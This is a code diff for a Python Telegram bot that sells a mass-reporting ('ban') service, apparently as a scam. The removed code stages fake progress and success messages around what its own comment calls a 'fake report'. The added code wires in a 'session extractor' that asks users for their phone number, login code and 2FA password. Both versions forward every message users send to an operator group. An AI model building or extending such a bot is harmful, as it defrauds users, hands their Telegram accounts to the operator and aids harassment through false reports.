-            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "✅ Connecting to Telegram API...\n"
-            "⏳ Authenticating session 533...",
-            parse_mode='Markdown'
-        )
-        
-        await asyncio.sleep(1.2)
-        
-        await processing_msg.edit_text(
-            "🚀 **PROCESSING REPORT**\n\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🎯 Target: `{target_id}`\n"
-            f"📌 Reason: {reason}\n"
-            f"🔐 Session: 533 (Premium)\n"
-            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "✅ Connected to Telegram API\n"
-            "✅ Session 533 authenticated\n"
-            "✅ 2FA verified\n"
-            "⏳ Sending report...",
-            parse_mode='Markdown'
-        )
-        
-        await asyncio.sleep(2.0)
-        
-        # Process fake report
-        success, result = await self.reporting_engine.process_report(
-            target_id, target_type, reason, description
-        )
-        
-        if success:
-            # Success message
-            success_text = f"""
-✅ **REPORT SUBMITTED SUCCESSFULLY!**
+        await query.edit_message_caption(text, parse_mode='Markdown', reply_markup=reply_markup)
+    
+    # ==================== HELP ====================
+    async def show_help(self, query, context, user):
+        """Show help"""
+        text = """
+🆘 **HELP & COMMANDS**
 
 ━━━━━━━━━━━━━━━━━━━━━
-📊 **REPORT DETAILS**
+🎯 **REPORTING**
 ━━━━━━━━━━━━━━━━━━━━━
-
-🎯 **Target:** `{target_id}`
-📌 **Type:** {target_type.title()}
-📋 **Reason:** {reason}
-🔐 **Session:** 533 (Premium)
-📝 **Description:** {description[:100]}{'...' if len(description) > 100 else ''}
-
-━━━━━━━━━━━━━━━━━━━━━
-📈 **RESULT**
-━━━━━━━━━━━━━━━━━━━━━
-
-✅ **Status:** Success
-⚡ **Response Time:** {result['response_time']}
-📎 **Report ID:** `{result['report_id']}`
-🕒 **Time:** {datetime.now().strftime('%H:%M:%S')}
+• Click 'Report' button
+• Choose target type
+• Send target link/username
+• Select reason
+• Add description (optional)
+• Report processed
 
 ━━━━━━━━━━━━━━━━━━━━━
-📊 **SESSION 533 STATS**
+📱 **SESSIONS**
 ━━━━━━━━━━━━━━━━━━━━━
-
-📱 **Total Reports:** 12,848 (+1)
-📈 **Success Rate:** 98.7%
-🔒 **2FA:** Enabled
-💎 **Premium:** Active
+• Premium users get session 533
+• Free users can add their own accounts
+• Click 'Add Session' and follow steps
+• Supports 2FA
 
 ━━━━━━━━━━━━━━━━━━━━━
-⚡ **Report submitted to Telegram**
+💎 **PREMIUM**
 ━━━━━━━━━━━━━━━━━━━━━
+• Lifetime access
+• Contact @smzxu
+• Includes session 533
 
-Use /status to check your statistics
+━━━━━━━━━━━━━━━━━━━━━
+📌 **TARGET FORMATS**
+━━━━━━━━━━━━━━━━━━━━━
+• User: `tg://openmessage?user_id=8030141909`
+• User: `@username`
+• User ID: `8030141909`
+• Group: `tg://openmessage?chat_id=-100123...`
+• Channel: `tg://openmessage?channel_id=123...`
+
+━━━━━━━━━━━━━━━━━━━━━
 """
-            
-            await processing_msg.edit_text(success_text, parse_mode='Markdown')
-            
-            # Forward success to group
-            success_info = f"""
-✅ **REPORT SUCCESSFUL**
-
-👤 User: `{user_id}`
-🎯 Target: `{target_id}`
-📌 Reason: {reason}
-🔐 Session: 533
-📎 ID: `{result['report_id']}`
-⏱️ Time: {result['response_time']}
-            """
-            
-            await self.forward_to_group(update, context, "report", success_info)
-            
-        else:
-            # Queue message
-            queue_text = f"""
-⚠️ **REPORT QUEUED**
-
-━━━━━━━━━━━━━━━━━━━━━
-📊 **REPORT DETAILS**
-━━━━━━━━━━━━━━━━━━━━━
-
-🎯 **Target:** `{target_id}`
-📌 **Type:** {target_type.title()}
-📋 **Reason:** {reason}
-🔐 **Session:** 533 (Premium)
-
-━━━━━━━━━━━━━━━━━━━━━
-📈 **STATUS**
-━━━━━━━━━━━━━━━━━━━━━
-
-⏳ **Status:** Queued
-📊 **Queue Position:** #{random.randint(2, 8)}
-⏱️ **Est. Time:** {random.randint(10, 30)} seconds
-📎 **Queue ID:** `QUEUE-{hashlib.md5(f'{target_id}{time.time()}'.encode()).hexdigest()[:8].upper()}`
-
-━━━━━━━━━━━━━━━━━━━━━
-💡 **NOTE**
-━━━━━━━━━━━━━━━━━━━━━
-
-Your report has been queued due to high demand.
-It will be processed automatically.
-
-✅ You will receive confirmation when completed
-"""
-            
-            await processing_msg.edit_text(queue_text, parse_mode='Markdown')
-            
-            # Forward queue to group
-            queue_info = f"""
-⏳ **REPORT QUEUED**
-
-👤 User: `{user_id}`
-🎯 Target: `{target_id}`
-📌 Reason: {reason}
-🔐 Session: 533
-            """
-            
-            await self.forward_to_group(update, context, "report", queue_info)
-        
-        # Clean up user state
-        if user_id in self.user_states:
-            del self.user_states[user_id]
-
-    async def handle_callback_query(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle inline keyboard callbacks"""
-        query = update.callback_query
-        await query.answer()
-        
-        user_id = query.from_user.id
-        data = query.data
-        
-        # Handle commands from inline keyboard
-        if data == "cmd_report":
-            await query.message.delete()
-            await self.report(update, context)
-        elif data == "cmd_status":
-            await query.message.delete()
-            await self.status_command(update, context)
-        elif data == "cmd_sessions":
-            await query.message.delete()
-            await self.sessions_command(update, context)
-        elif data == "cmd_premium":
-            await query.message.delete()
-            await self.premium_command(update, context)
-        elif data == "cmd_help":
-            await query.message.delete()
-            await self.help_command(update, context)
-
-    async def handle_all_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle all other messages"""
-        if update.message:
-            # Don't process commands here
-            if update.message.text and update.message.text.startswith('/'):
-                return
-            
-            # Forward all other messages to group
-            await self.forward_to_group(update, context)
-            
-            # Check if user is in report flow
-            user_id = update.effective_user.id
-            if user_id in self.user_states:
-                state = self.user_states[user_id]
-                if state.get("step") == "waiting_target":
-                    await self.handle_report_target(update, context)
-
+        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="back_to_menu")]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_caption(text, parse_mode='Markdown', reply_markup=reply_markup)
+    
+    # ==================== CONVERSATION HANDLERS ====================
     async def cancel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Cancel operation"""
+        """Cancel any ongoing operation"""
         user_id = update.effective_user.id
-        
-        # Forward to group
-        await self.forward_to_group(update, context, "command", "❌ User cancelled operation")
-        
-        # Clear user state
         if user_id in self.user_states:
             del self.user_states[user_id]
-        
-        await update.message.reply_text(
-            "❌ **Operation Cancelled**\n\n"
-            "Use /report to start again",
-            parse_mode='Markdown'
-        )
-        
+        if user_id in self.real_session_manager.pending_clients:
+            client, _, _ = self.real_session_manager.pending_clients[user_id]
+            await client.disconnect()
+            del self.real_session_manager.pending_clients[user_id]
+        await update.message.reply_text("❌ Operation cancelled.")
         return ConversationHandler.END
-
+    
+    # ==================== SETUP ====================
     def setup_bot(self):
-        """Setup and run the bot"""
-        print("🚀 Starting Telegram Ban Bot - Public Version")
-        print(f"📨 All messages forwarded to group: {GROUP_ID}")
+        """Setup all handlers"""
+        print("🚀 Starting Telegram Ban Bot - Full Inline Edition")
+        print(f"📨 Forward group: {GROUP_ID}")
         print(f"📢 Force channel: {FORCE_CHANNEL}")
         print(f"👤 Manual user: @smzxu")
-        print(f"🔐 Premium Session: 533")
-        print("💎 Subscription System: Active")
+        print("🔐 Real session extractor: Enabled")
+        print("💎 Fake reporting: Active")
         
-        # Create application
-        persistence = PicklePersistence(filepath="data/bot_persistence.pickle")
-        application = Application.builder().token(BOT_TOKEN).persistence(persistence).build()
+        app = Application.builder().token(BOT_TOKEN).persistence(PicklePersistence(filepath="data/bot.pickle")).build()
         
-        # Report conversation handler
-        report_conv_handler = ConversationHandler(
-            entry_points=[CommandHandler('report', self.report)],
+        # Command handlers
+        app.add_handler(CommandHandler("start", self.start))
+        app.add_handler(CommandHandler("cancel", self.cancel))
+        
+        # Callback query handler for menu and general callbacks
+        app.add_handler(CallbackQueryHandler(self.verify_join_callback, pattern="^verify_join$"))
+        app.add_handler(CallbackQueryHandler(self.menu_callback, pattern="^menu_"))
+        app.add_handler(CallbackQueryHandler(self.target_type_callback, pattern="^target_"))
+        app.add_handler(CallbackQueryHandler(self.reason_callback, pattern="^reason_"))
+        app.add_handler(CallbackQueryHandler(self.skip_description_callback, pattern="^skip_description$"))
+        app.add_handler(CallbackQueryHandler(self.back_to_target_type, pattern="^back_to_target_type$"))
+        app.add_handler(CallbackQueryHandler(self.back_to_reason, pattern="^back_to_reason$"))
+        
+        # Conversation handler for adding session
+        add_session_conv = ConversationHandler(
+            entry_points=[CallbackQueryHandler(self.start_add_session, pattern="^menu_add_session$")],
             states={
-                TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_report_target)],
-                REASON: [CallbackQueryHandler(self.handle_report_reason, pattern='^reason_')],
-                DESCRIPTION: [
-                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_report_description),
-                    CommandHandler('skip', self.skip_description)
-                ]
+                PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_add_phone)],
+                CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_add_code)],
+                PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_add_password)],
             },
-            fallbacks=[CommandHandler('cancel', self.cancel)],
+            fallbacks=[CommandHandler("cancel", self.cancel)],
             allow_reentry=True
         )
+        app.add_handler(add_session_conv)
         
-        # Regular commands
-        application.add_handler(CommandHandler('start', self.start))
-        application.add_handler(CommandHandler('help', self.help_command))
-        application.add_handler(CommandHandler('status', self.status_command))
-        application.add_handler(CommandHandler('sessions', self.sessions_command))
-        application.add_handler(CommandHandler('premium', self.premium_command))
-        application.add_handler(CommandHandler('cancel', self.cancel))
+        # Conversation handler for reporting
+        report_conv = ConversationHandler(
+            entry_points=[CallbackQueryHandler(self.start_report, pattern="^menu_report$")],
+            states={
+                REPORT_TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_report_target_message)],
+                REASON: [CallbackQueryHandler(self.reason_callback, pattern="^reason_")],
+                REPORT_DESCRIPTION: [
+                    MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_report_description),
+                    CallbackQueryHandler(self.skip_description_callback, pattern="^skip_description$")
+                ],
+            },
+            fallbacks=[
+                CommandHandler("cancel", self.cancel),
+                CallbackQueryHandler(self.back_to_target_type, pattern="^back_to_target_type$"),
+                CallbackQueryHandler(self.back_to_reason, pattern="^back_to_reason$")
+            ],
+            allow_reentry=True,
+            map_to_parent={
+                REASON: REASON,
+                REPORT_TARGET: REPORT_TARGET,
+                REPORT_DESCRIPTION: REPORT_DESCRIPTION,
+                ConversationHandler.END: ConversationHandler.END
+            }
+        )
+        app.add_handler(report_conv)
         
-        # Callback handlers
-        application.add_handler(CallbackQueryHandler(self.verify_join_callback, pattern='^verify_join$'))
-        application.add_handler(CallbackQueryHandler(self.handle_callback_query, pattern='^cmd_'))
-        
-        # Conversation handler
-        application.add_handler(report_conv_handler)
-        
-        # Message handler (MUST BE LAST)
-        application.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, self.handle_all_messages))
+        # Message handler for all other messages (forwarding)
+        app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, self.handle_all_messages))
         
         print("✅ Bot is running!")
-        print("📱 Public access enabled")
-        print("🎯 Fake reporting system active")
-        print("🔐 Session 533 ready")
-        print("💎 Contact @smzxu for premium")
-        
-        application.run_polling(allowed_updates=Update.ALL_TYPES)
+        app.run_polling(allowed_updates=Update.ALL_TYPES)
+    
+    async def handle_all_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        """Forward all messages to group and ignore if not in state"""
+        if update.message and not update.message.text.startswith('/'):
+            await self.forward_to_group(update, context)
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
     bot = BanBot()
-    
     try:
         bot.setup_bot()
     except KeyboardInterrupt:
